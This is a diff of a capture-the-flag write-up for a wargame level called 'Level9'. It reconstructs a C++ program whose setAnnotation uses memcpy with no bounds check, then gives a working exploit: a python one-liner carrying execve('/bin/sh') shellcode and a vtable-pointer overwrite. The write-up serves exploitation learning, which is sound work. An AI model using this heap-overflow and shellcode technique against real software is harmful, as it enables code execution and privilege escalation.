@@ -1,3 +1,65 @@
+# Level9
+
+## Code
+
+```
+#include <iostream>
+#include <string.h>
+
+class N
+{
+    private:
+        char _annotation[100];
+        int         _n;
+
+    public:
+        N(int n);
+        void        setAnnotation(char *str);
+        virtual int operator+(N const & rhs);
+        virtual int operator-(N const & rhs);
+};
+
+N::N(int n)
+{
+  this->_n = n;
+  return;
+}
+
+void N::setAnnotation(char *str)
+{
+  memcpy(this->_annotation, str, strlen(str));
+}
+
+int N::operator+(N const & rhs)
+{
+  return (this->_n + rhs._n);
+}
+
+int N::operator-(N const & rhs)
+{
+  return (this->_n - rhs._n);
+}
+
+
+int main(int argc, char *argv[])
+{
+  N *n1;
+  N *n2;
+  
+  if (argc < 2) {
+    exit(1);
+  }
+
+  n1 = new N(5);
+  n2 = new N(6);
+  n1->setAnnotation(argv[1]);
+  return (*n1 + *n2);
+}
+```
+
+## Explanation
+
+
 - Here we have a c++ program, much more difficult to read and understand in assembly,
     or in decompilers...
 
@@ -40,6 +102,9 @@
     +   (108 - shellcodeLength - 4) random characters to reach N2's vtable
     +   the address of where this string will be copied (0x804a008 + 4 = 0x0804a00c)
 
-- Here's our final command :
+## Exploit
 
-    ./level9 "$(python -c "print '\x08\x04\xa0\x10'[::-1] + '\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80' + 'A' * (108 - 24 - 4) + '\x08\x04\xa0\x0c'[::-1]")"
+- Here's our final command :
+```
+$    ./level9 "$(python -c "print '\x08\x04\xa0\x10'[::-1] + '\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80' + 'A' * (108 - 24 - 4) + '\x08\x04\xa0\x0c'[::-1]")"
+```
